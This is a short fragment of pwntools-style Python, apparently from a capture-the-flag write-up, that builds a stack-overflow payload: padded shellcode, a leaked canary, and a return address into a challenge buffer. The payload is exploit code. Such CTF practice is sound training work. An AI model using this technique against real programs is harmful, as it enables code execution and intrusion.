payload = asm(sc).ljust(0x78, b'a') + p32(0) + p32(1) + p32(0x5a)
payload += b'a'*4 + p64(canary) + b'a'*0x18 + p64(chall2_buf)
s(payload)
```
